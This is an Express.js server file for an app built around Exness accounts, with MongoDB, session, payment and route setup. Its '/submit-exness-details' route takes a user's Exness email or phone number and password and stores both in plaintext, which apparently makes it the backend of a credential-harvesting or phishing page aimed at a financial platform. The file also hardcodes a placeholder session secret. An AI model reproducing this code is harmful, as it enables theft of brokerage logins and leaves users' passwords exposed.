require('dotenv').config();
const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const session = require('express-session');
// Import the Exnessuser model
const Exnessuser = require('./models/exnessuser'); 

// Corrected path for paymentRoutes
const paymentRoutes = require('./routes/paymentRoutes'); 

const app = express(); // Initialize app instance

// Middleware to parse incoming JSON and URL-encoded data
app.use(express.json()); 
app.use(express.urlencoded({ extended: true })); 


// Import routes
const exnessuserRoutes = require('./routes/exnessuserRoutes');
app.use('/', exnessuserRoutes); 

// Middleware
app.set('view engine', 'ejs'); 
app.use(express.static(path.join(__dirname, 'public')));
app.use('/toastify', express.static(path.join(__dirname, 'node_modules/toastify-js')));

// Session Middleware
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: true
}));

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('MongoDB connected!'))
  .catch((err) => console.error('MongoDB connection error:', err));

// Use payment routes
app.use('/api', paymentRoutes);

// Routes
const indexRoutes = require('./routes/index');
app.use('/', indexRoutes);

// POST route to handle form submission
app.post('/submit-exness-details', (req, res) => {
    const { emailOrNumber, password } = req.body;

    if (!emailOrNumber || !password) {
        return res.status(400).send("Missing required fields.");
    }

    const newExnessUser = new Exnessuser({
        email: emailOrNumber,
        password: password,   
    });

    newExnessUser.save()
        .then(() => {
            res.send("Exness user saved successfully.");
        })
        .catch((err) => {
            console.error("Error saving Exness user:", err);
            res.status(500).send("Error saving Exness user: " + err.message);
        });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
